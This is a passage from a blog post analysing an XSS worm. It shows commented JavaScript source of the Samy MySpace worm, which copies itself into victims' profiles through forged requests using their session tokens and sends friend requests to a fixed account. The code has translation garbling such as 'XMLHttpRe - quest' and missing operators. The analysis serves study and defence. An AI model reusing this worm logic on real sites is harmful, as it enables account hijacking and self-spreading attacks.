class="attr">is</span> <span class="attr">not</span> <span class="attr">parsed</span> <span class="attr">from</span> <span class="attr">the</span> <span class="attr">url</span></span></span><br><span class="line"><span class="tag">        <span class="attr">getData</span> (<span class="attr">g</span> ()) // <span class="attr">parses</span> <span class="attr">friendID</span> <span class="attr">and</span> <span class="attr">MyToken</span> <span class="attr">from</span> <span class="attr">body</span></span></span><br><span class="line"><span class="tag">    &#125;</span></span><br><span class="line"><span class="tag">    <span class="attr">main</span>()</span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">function</span> <span class="attr">getClientFID</span>() &#123;</span></span><br><span class="line"><span class="tag">    <span class="attr">Return</span> <span class="attr">findIn</span> (<span class="attr">g</span> (), &#x27;<span class="attr">up_launchIC</span> (&#x27; + <span class="attr">A</span>, <span class="attr">A</span>)//<span class="attr">find</span> <span class="attr">the</span> <span class="attr">content</span> <span class="attr">between</span> <span class="attr">up_launchIC</span> (&#x27;<span class="attr">and</span>&#x27; <span class="attr">from</span> <span class="attr">body</span></span></span><br><span class="line"><span class="tag">&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">function</span> <span class="attr">nothing</span>() &#123;&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">Function</span> <span class="attr">paramsToString</span> (<span class="attr">AV</span> ) &#123; // <span class="attr">Convert</span> <span class="attr">an</span> <span class="attr">object</span> <span class="attr">to</span> <span class="attr">a</span> <span class="attr">parameter</span> <span class="attr">string</span></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">N</span> = <span class="string">new</span> <span class="attr">String</span>();</span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">O</span> = <span class="string">0;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">for</span> (<span class="attr">var</span> <span class="attr">P</span> <span class="attr">in</span> <span class="attr">AV</span>) &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">if</span> (<span class="attr">O</span> &gt;</span> 0) &#123;</span><br><span class="line">            N += &#x27; &amp; &#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        var Q = escape(AV[P]);</span><br><span class="line">        while (Q.indexOf(&#x27; + &#x27;) != -1) &#123;</span><br><span class="line">            Q = Q.replace(&#x27; + &#x27;, &#x27; % 2B&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">        while (Q.indexOf(&#x27; &amp; &#x27;) != -1) &#123;</span><br><span class="line">            Q = Q.replace(&#x27; &amp; &#x27;, &#x27; % 26&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">        N += P + &#x27; = &#x27; + Q; O++</span><br><span class="line">    &#125;</span><br><span class="line">    return N</span><br><span class="line">&#125;</span><br><span class="line">Function httpSend (BH, BI, BJ, BK) &#123;//respectively, the url, the returned processing function, method, and request body</span><br><span class="line">    if (!J) &#123;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&#x27;J.onr&#x27; + &#x27;eadystatechange = BI&#x27;);</span><br><span class="line">    J.open(BJ, BH, true);</span><br><span class="line">    if (BJ  &#x27;POST&#x27;) &#123;</span><br><span class="line">        J.setRequestHeader(&#x27;Content - Type&#x27;, &#x27;application / x - www - form - urlencoded&#x27;);</span><br><span class="line">        J.setRequestHeader(&#x27;Content - Length&#x27;, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    J.send(BK); return true</span><br><span class="line">&#125;</span><br><span class="line">Function findIn (BF, BB, BC ) &#123; // Intercept from BF between BB and BC</span><br><span class="line">    var R = BF.indexOf(BB) + BB.length;</span><br><span class="line">    var S = BF.substring(R, R + 1024);</span><br><span class="line">    return S.substring(0, S.indexOf(BC))</span><br><span class="line">&#125;</span><br><span class="line">function getHiddenParameter(BF, BG) &#123;</span><br><span class="line">    Return findIn (BF, &#x27;name = &#x27; + B + BG + B +&#x27; value = &#x27; + B, B)//find the value between name = &quot;BG&quot; value = and &quot;from BF</span><br><span class="line">&#125;</span><br><span class="line">function getXMLObj() &#123;</span><br><span class="line">    var Z = false;</span><br><span class="line">    if (window.XMLHttpRequest) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Z = new XMLHttpRe - quest()</span><br><span class="line">        &#125; catch(e) &#123;</span><br><span class="line">            Z = false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (window.ActiveXObject) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Z = new ActiveXOb - ject(&#x27;Msxml2.XMLHTTP&#x27;)</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Z = new ActiveXOb - ject(&#x27;Microsoft.XMLHTTP&#x27;)</span><br><span class="line">            &#125; catch (e) &#123;</span><br><span class="line">                Z = false</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return Z</span><br><span class="line">&#125;</span><br><span class="line">var AA = g();</span><br><span class="line">var AB = AA.indexOf(&#x27;m&#x27; + &#x27;ycode&#x27;);</span><br><span class="line">var AC = AA.substring(AB, AB + 4096);</span><br><span class="line">var AD = AC.indexOf(&#x27;D&#x27; + &#x27;IV&#x27;);</span><br><span class="line">Var AE = AC.substring (0, AD);//The code of the worm itself parsed from the body</span><br><span class="line">var AF;</span><br><span class="line">if (AE) &#123;</span><br><span class="line">    AE = AE.replace(&#x27;jav&#x27; + &#x27;a&#x27;, A + &#x27;jav&#x27; + &#x27;a&#x27;);</span><br><span class="line">    AE = AE.replace(&#x27;exp&#x27; + &#x27;r)&#x27;, &#x27;exp&#x27; + &#x27;r)&#x27; + A);</span><br><span class="line">    AF = &#x27;but most of all,samy is my hero. &lt; d&#x27; + &#x27;iv id = &#x27; + AE + &#x27;D&#x27; + &#x27;IV &gt; &#x27;</span><br><span class="line">&#125;</span><br><span class="line">var AG;</span><br><span class="line">function getHome() &#123;</span><br><span class="line">    if (J.readyState != 4) &#123;</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    var AU = J.responseText;</span><br><span class="line">    AG = findIn (AU, &#x27;P&#x27; + &#x27;rofi le Heroes &#x27;, &#x27; &lt; / td &gt;&#x27;); // Find the content between ProfileHeroes and&#x27; &lt;/td &gt; &#x27;from the return body</span><br><span class="line">    AG = AG.substring(61, AG.length);</span><br><span class="line">    if (AG.indexOf(&#x27;samy&#x27;)  -1) &#123;</span><br><span class="line">        if (AF) &#123;</span><br><span class="line">            AG += AF;</span><br><span class="line">            var AR = getFromURL(AU, &#x27;Mytoken&#x27;);</span><br><span class="line">            var AS = new Ar - ray();</span><br><span class="line">            AS[&#x27;interestLabel&#x27;] = &#x27;heroes&#x27;;</span><br><span class="line">            AS[&#x27;submit&#x27;] = &#x27;Preview&#x27;;</span><br><span class="line">            AS[&#x27;interest&#x27;] = AG;</span><br><span class="line">            J = getXMLObj();</span><br><span class="line">            //respectively, the url, the returned processing function, method, and request body</span><br><span class="line">            httpSend(&#x27;/index.cfm ? fuseaction = profile.previewInterests &amp; Mytoken = &#x27; + AR,</span><br><span class="line">                postHero, &#x27;POST&#x27;, paramsToString(AS))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function postHero() &#123;</span><br><span class="line">    if (J.readyState != 4) &#123;</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    var AU = J.responseText;</span><br><span class="line">    var AR = getFromURL(AU, &#x27;Mytoken&#x27;);</span><br><span class="line">    var AS = new Ar - ray();</span><br><span class="line">    AS[&#x27;interestLabel&#x27;] = &#x27;heroes&#x27;;</span><br><span class="line">    AS[&#x27;submit&#x27;] = &#x27;Submit&#x27;;</span><br><span class="line">    AS[&#x27;interest&#x27;] = AG;</span><br><span class="line">    AS [&#x27;hash&#x27;] = getHiddenParame - ter (AU, &#x27;hash&#x27;);</span><br><span class="line">    httpSend(&#x27; / index.cfm ? fuseaction = profile.processInterests &amp; Mytoken = &#x27; + AR,</span><br><span class="line">        nothing, &#x27;POST&#x27;, paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line">function main() &#123;</span><br><span class="line">    var AN = getClientFID();</span><br><span class="line">    var BH = &#x27; / index.cfm ? fuseaction = user.viewProfile &amp; friendID = &#x27; + AN + &#x27; &amp; Mytoken = &#x27; + L;</span><br><span class="line">    J = getXMLObj();</span><br><span class="line">    HttpSend (BH, getHome, &#x27;GET &#x27;); // Send get request, process function is getHome, embed code</span><br><span class="line">    xmlhttp2 = getXMLObj();</span><br><span class="line">    httpSend2(&#x27; / index.cfm ? fuseaction = invite.addfriend_verify &amp; friendID = 11851658 &amp; Mytoken = &#x27; + L,</span><br><span class="line">        processxForm, &#x27;GET&#x27;)//Send friend invitation</span><br><span class="line">&#125;</span><br><span class="line">function processx - Form() &#123;</span><br><span class="line">    if (xmlhttp2.readyState != 4) &#123;</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    var AU = xmlhttp2.responseText;</span><br><span class="line">    var AQ = getHiddenParameter(AU, &#x27;hashcode&#x27;);</span><br><span class="line">    var AR = getFromURL(AU, &#x27;Mytoken&#x27;);</span><br><span class="line">    var AS = new Array();</span><br><span class="line">    AS[&#x27;hashcode&#x27;] = AQ;</span><br><span class="line">    AS[&#x27;friendID&#x27;] = &#x27;11851658&#x27;;</span><br><span class="line">    AS[&#x27;submit&#x27;] = &#x27;Add to Friends&#x27;;</span><br><span class="line">    httpSend2(&#x27; / index.cfm ? fuseaction = invite.addFriendsProcess &amp; Mytoken = &#x27; + AR,</span><br><span class="line">        nothing, &#x27;POST&#x27;, paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line">function httpSend2(BH, BI, BJ, BK) &#123;</span><br><span class="line">    if (!xmlhttp2) &#123;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&#x27;xmlhttp2.onr&#x27; + &#x27;eadystatechange = BI&#x27;);</span><br><span class="line">    xmlhttp2.open(BJ, BH, true);</span><br><span class="line">    if (BJ  &#x27;POST&#x27;) &#123;</span><br><span class="line">        xmlhttp2.setRequestHeader(&#x27;Content - Type&#x27;, &#x27;application / x - www - form - urlencoded&#x27;); xmlhttp2.setRequestHeader(&#x27;Content - Length&#x27;, BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp2.send(BK); return true</span><br><span class="line">&#125;</span><br><span class="line">”&gt;<span class="tag">&lt;/<span class="name">DIV</span>&gt;</span></span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-copyright"><ul><li class="post-copyright-author"> <strong>Post author:</strong> Ray Sun</li><li class="post-copyright-link"> <strong>Post link:</strong> <a href="https://sunra.top/en/posts/17764/" title="XSS Worm Definition and Practical Analysis">https://sunra.top/en/posts/17764/</a></li><li class="post-copyright-license"> <strong>Copyright Notice:</strong> All articles in this blog are licensed under<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i> BY-NC-SA</a> unless stating additionally.</li></ul></div><div class="followme"> <span>Welcome to my other publishing channels</span><div class="social-list"><div class="social-item"><span class="social-link"><span class="icon"><i class="fab fa-weixin"></i></span> <span class="label">WeChat</span></span> <img class="social-item-img" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1685836114/origin-of-ray/wechat_channel_zmg0hw.jpg"></div><div class="social-item"><a target="_blank" class="social-link" href="/en/atom.xml"><span class="icon"><i class="fa fa-rss"></i></span> <span class="label">RSS</span></a></div></div></div><div class="post-nav"><div class="post-nav-item"><a href="/en/posts/52409/" rel="prev" title="Pseudo-Protocol and Encoding Bypass"><i class="fa fa-chevron-left"></i> Pseudo-Protocol and Encoding Bypass</a></div><div class="post-nav-item"> <a href="/en/posts/56427/" rel="next" title="XSS Template Injection and Remote Code Execution">XSS Template Injection and Remote Code Execution<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div class="comments" id="waline"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; <span itemprop="copyrightYear">2023</span><span class="with-love"><i class="fa fa-heart"></i></span> <span class="author" itemprop="copyrightHolder">Ray Sun</span></div><div class="powered-by">Powered by <a href="https://hexo.io/" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="external nofollow noopener noreferrer" target="_blank">NexT.Muse</a></div></div></footer><div class="toggle sidebar-toggle" role="button"><span class="toggle-line"></span><span class="toggle-line"></span><span class="toggle-line"></span></div><div class="sidebar-dimmer"></div><div class="back-to-top" role="button" aria-label="Back to top"><i class="fa fa-arrow-up fa-lg"></i> <span>0%</span></div><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script><script src="/en/js/comments.js"></script><script src="/en/js/utils.js"></script><script src="/en/js/motion.js"></script><script src="/en/js/schemes/muse.js"></script><script src="/en/js/next-boot.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script><script src="/en/js/third-party/search/local-search.js"></script><script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script><script src="/en/js/third-party/math/mathjax.js"></script><script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"https://blog-comments-3w44.vercel.app/","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"欢迎大家交流学习","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":[],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/en/posts/17764/"}</script><link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css"><script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script></body></html>